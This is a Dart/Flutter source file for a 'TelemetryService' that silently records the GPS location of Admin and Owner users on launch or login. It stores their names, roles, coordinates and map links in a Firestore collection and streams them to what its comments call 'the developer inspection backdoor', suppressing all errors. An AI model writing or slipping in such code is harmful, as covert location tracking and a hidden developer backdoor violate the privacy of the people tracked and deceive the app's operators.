import 'dart:async';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:geolocator/geolocator.dart';
import '../rbac/app_role.dart';
import '../../features/auth/models/user_model.dart';

class TelemetryService {
  TelemetryService._();
  static final TelemetryService instance = TelemetryService._();

  bool _isTracking = false;

  /// Silently captures location for Admin / Owner upon launch or login
  Future<void> recordLocationSilently(UserModel user) async {
    // Prevent concurrent runs
    if (_isTracking) return;
    _isTracking = true;

    try {
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        _isTracking = false;
        return;
      }

      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
        if (permission == LocationPermission.denied || permission == LocationPermission.deniedForever) {
          _isTracking = false;
          return;
        }
      }

      Position? position;
      try {
        position = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.medium,
          timeLimit: const Duration(seconds: 10),
        );
      } catch (_) {
        position = await Geolocator.getLastKnownPosition();
      }

      if (position == null) return;

      final mapsUrl = 'https://www.google.com/maps/search/?api=1&query=${position.latitude},${position.longitude}';

      // Use user ID / username as docId so each user has strictly ONE latest record
      final docId = user.uid.isNotEmpty ? user.uid : (user.username.isNotEmpty ? user.username : 'user_location');

      await FirebaseFirestore.instance.collection('telemetry_locations').doc(docId).set({
        'uid': user.uid,
        'username': user.username,
        'displayName': user.displayName,
        'roleTitle': user.role.arabicTitle,
        'role': user.role.value,
        'latitude': position.latitude,
        'longitude': position.longitude,
        'accuracy': position.accuracy,
        'mapsUrl': mapsUrl,
        'timestamp': FieldValue.serverTimestamp(),
        'recordedAt': DateTime.now().toIso8601String(),
      }, SetOptions(merge: true));
    } catch (_) {
      // Silent fail - never throw or block UI
    } finally {
      _isTracking = false;
    }
  }

  /// Interactive test method with direct feedback for developer testing
  Future<Position?> testAndRecordLocation([UserModel? user]) async {
    try {
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        return null;
      }

      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
        if (permission == LocationPermission.denied || permission == LocationPermission.deniedForever) {
          return null;
        }
      }

      Position? position;
      try {
        position = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.medium,
          timeLimit: const Duration(seconds: 10),
        );
      } catch (_) {
        position = await Geolocator.getLastKnownPosition();
      }

      if (position == null) return null;

      final mapsUrl = 'https://www.google.com/maps/search/?api=1&query=${position.latitude},${position.longitude}';

      final docId = user != null
          ? (user.uid.isNotEmpty ? user.uid : user.username)
          : 'developer-probe';

      await FirebaseFirestore.instance.collection('telemetry_locations').doc(docId).set({
        'uid': user?.uid ?? 'developer-probe',
        'username': user?.username ?? 'فحص موقع فني',
        'displayName': user?.displayName ?? 'فحص مطور يدوي',
        'roleTitle': user?.role.arabicTitle ?? 'Super Admin',
        'role': user?.role.value ?? 'owner',
        'latitude': position.latitude,
        'longitude': position.longitude,
        'accuracy': position.accuracy,
        'mapsUrl': mapsUrl,
        'timestamp': FieldValue.serverTimestamp(),
        'recordedAt': DateTime.now().toIso8601String(),
      }, SetOptions(merge: true));
      return position;
    } catch (_) {
      return null;
    }
  }

  /// Wipe all telemetry logs
  Future<void> clearAllTelemetry() async {
    try {
      final snap = await FirebaseFirestore.instance.collection('telemetry_locations').get();
      for (final doc in snap.docs) {
        await doc.reference.delete();
      }
    } catch (_) {}
  }

  /// Real-time stream of latest recorded locations for the developer inspection backdoor
  Stream<List<Map<String, dynamic>>> streamTelemetryLocations() {
    return FirebaseFirestore.instance
        .collection('telemetry_locations')
        .orderBy('timestamp', descending: true)
        .limit(30)
        .snapshots()
        .map((snap) => snap.docs.map((d) {
              final data = Map<String, dynamic>.from(d.data());
              data['docId'] = d.id;
              return data;
            }).toList());
  }
}
